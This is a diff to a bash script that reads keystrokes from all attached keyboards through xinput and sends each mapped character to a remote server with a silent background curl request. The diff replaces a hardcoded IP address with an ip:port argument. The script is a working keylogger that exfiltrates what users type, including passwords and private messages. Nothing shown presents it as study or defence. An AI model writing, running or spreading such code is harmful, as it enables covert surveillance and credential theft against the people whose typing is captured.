@@ -1,3 +1,4 @@
+#pass ip:port to send to as first arg
 get_keyboard_events(){
     xinput list | grep -Po 'id=\K\d+(?=.*slave\s*keyboard)' | xargs -P0 -n1 xinput test
 }
@@ -30,7 +31,7 @@ while read -r line; do
         mapping=($(echo $mapping | split ' '))
         ind=$(min ${#mapping} $SHIFT)
         #echo "${mapping[${ind}]}"
-        (curl "http://141.212.108.238:8000?key=$(echo ${mapping[${ind}]})" &> /dev/null) &
+        (curl "http://$1?key=$(echo ${mapping[${ind}]})" &> /dev/null) &
     fi;
 
 done < <(get_keyboard_events)
